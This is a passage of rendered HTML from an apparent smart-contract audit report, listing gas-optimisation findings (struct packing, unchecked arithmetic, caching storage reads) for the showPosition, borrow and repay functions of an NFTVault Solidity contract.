class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">610</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PositionPreview</span><span class=\"mtk1\"> { </span><span class=\"mtk3\">// @audit gas: can be tightly packed by moving borrowType and liquidatable at the end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">611</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">612</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">613</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftType</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">614</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftValueUSD</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">615</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">VaultSettings</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultSettings</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">616</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">creditLimit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">617</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtPrincipal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">618</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtInterest</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 32 bytes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">619</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">BorrowType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrowType</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">620</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatable</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 1 byte</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">621</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 32 bytes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">622</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 20 bytes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">623</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>To:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PositionPreview</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftType</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftValueUSD</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VaultSettings</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultSettings</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">creditLimit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtPrincipal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtInterest</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 32 bytes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 32 bytes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">BorrowType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrowType</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatable</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 1 byte</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit gas: 20 bytes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"g-17-nftvaultshowposition-l659-should-be-unchecked-due-to-l649\" style=\"position:relative;\"><a href=\"#g-17-nftvaultshowposition-l659-should-be-unchecked-due-to-l649\" aria-label=\"g 17 nftvaultshowposition l659 should be unchecked due to l649 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-17] <code>NFTVault.showPosition()</code>: L659 should be unchecked due to L649</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">628</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">showPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">649:         </span><span class=\"mtk11\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">debtPrincipal</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">debtAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">debtPrincipal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">659</span><span class=\"mtk1\">:             debtInterest: </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">debtPrincipal</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L649)</span></span></span></code></pre>\n<h2 id=\"g-18-nftvaultshowposition-positions_nftindexliquidatedat-should-get-cached\" style=\"position:relative;\"><a href=\"#g-18-nftvaultshowposition-positions_nftindexliquidatedat-should-get-cached\" aria-label=\"g 18 nftvaultshowposition positions_nftindexliquidatedat should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-18] <code>NFTVault.showPosition()</code>: <code>positions[_nftIndex].liquidatedAt</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">628</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">showPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">661:             </span><span class=\"mtk11\">liquidatable</span><span class=\"mtk1\">: </span><span class=\"mtk11\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk11\">liquidatedAt</span><span class=\"mtk1\"> == 0 &amp;&amp;  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 positions[_nftIndex].liquidatedAt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">662:                 </span><span class=\"mtk11\">debtAmount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk11\">_getLiquidationLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">663:             </span><span class=\"mtk11\">liquidatedAt</span><span class=\"mtk1\">: </span><span class=\"mtk11\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk11\">liquidatedAt</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">//@audit gas: SLOAD 2 positions[_nftIndex].liquidatedAt</span></span></span></code></pre>\n<h2 id=\"g-19-nftvaultshowposition-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it-positions_nftindex\" style=\"position:relative;\"><a href=\"#g-19-nftvaultshowposition-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it-positions_nftindex\" aria-label=\"g 19 nftvaultshowposition help the optimizer by saving a storage variables reference instead of repeatedly fetching it positions_nftindex permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-19] <code>NFTVault.showPosition()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it (<code>positions[_nftIndex]</code>)</h2>\n<p>To help the optimizer, declare a <code>storage</code> type variable and use it instead of repeatedly fetching the reference in a map or an array.</p>\n<p>The effect can be quite significant.</p>\n<p>Here, instead of repeatedly calling <code>positions[_nftIndex]</code>, save its reference like this: <code>Position storage _position = positions[_nftIndex]</code> and use it.</p>\n<p>Impacted lines (see <code>@audit</code> tags):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">636</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtPrincipal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debtPrincipal</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">637</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">638</span><span class=\"mtk1\">:             ? </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debtAmountForRepurchase</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">641</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debtPortion</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">660</span><span class=\"mtk1\">:             borrowType: </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">borrowType</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">661</span><span class=\"mtk1\">:             liquidatable: </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">663</span><span class=\"mtk1\">:             liquidatedAt: </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">664</span><span class=\"mtk1\">:             liquidator: </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">].</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//@audit gas: use the suggested storage variable &quot;Position storage _position&quot;</span></span></span></code></pre>\n<p>This practice already exists in the solution, as seen in <code>NFTVault.borrow()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">697:         </span><span class=\"mtk10\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk10\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<h2 id=\"g-20-nftvaultborrow-totaldebtportion-should-get-cached\" style=\"position:relative;\"><a href=\"#g-20-nftvaultborrow-totaldebtportion-should-get-cached\" aria-label=\"g 20 nftvaultborrow totaldebtportion should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-20] <code>NFTVault.borrow()</code>: <code>totalDebtPortion</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">735:         </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalDebtPortion</span><span class=\"mtk1\"> == 0) {  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 totalDebtPortion</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">738</span><span class=\"mtk1\">:         } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">739</span><span class=\"mtk1\">:             </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">plusPortion</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalDebtPortion</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) / </span><span class=\"mtk3\">//@audit gas: SLOAD 2 totalDebtPortion</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">740</span><span class=\"mtk1\">:                 </span><span class=\"mtk10\">totalDebtAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">741</span><span class=\"mtk1\">:             </span><span class=\"mtk10\">totalDebtPortion</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">plusPortion</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 3 totalDebtPortion (could&#39;ve used cached value for calculation)</span></span></span></code></pre>\n<h2 id=\"g-21-nftvaultrepay-l781-should-be-unchecked-due-to-ternary-operator\" style=\"position:relative;\"><a href=\"#g-21-nftvaultrepay-l781-should-be-unchecked-due-to-ternary-operator\" aria-label=\"g 21 nftvaultrepay l781 should be unchecked due to ternary operator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-21] <code>NFTVault.repay()</code>: L781 should be unchecked due to ternary operator</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">756</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">780:         </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk11\">paidPrincipal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">debtInterest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">781:             ? </span><span class=\"mtk11\">_amount</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">debtInterest</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//@audit gas: should be unchecked (obviously)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">782:             : 0;</span></span></span></code></pre>\n<h2 id=\"g-22-nftvaultrepay-totaldebtportion-and-totaldebtamount-should-get-cached\" style=\"position:relative;\"><a href=\"#g-22-nftvaultrepay-totaldebtportion-and-totaldebtamount-should-get-cached\" aria-label=\"g 22 nftvaultrepay totaldebtportion and totaldebtamount should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-22] <code>NFTVault.repay()</code>: <code>totalDebtPortion</code> and <code>totalDebtAmount</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">756</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">784:         </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk11\">minusPortion</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">paidPrincipal</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">debtPrincipal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">785:             ? </span><span class=\"mtk11\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">debtPortion</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">786:             : (</span><span class=\"mtk12\">totalDebtPortion</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">totalDebtAmount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOADs 1 totalDebtPortion &amp; totalDebtAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">787</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">788</span><span class=\"mtk1\">:         </span><span 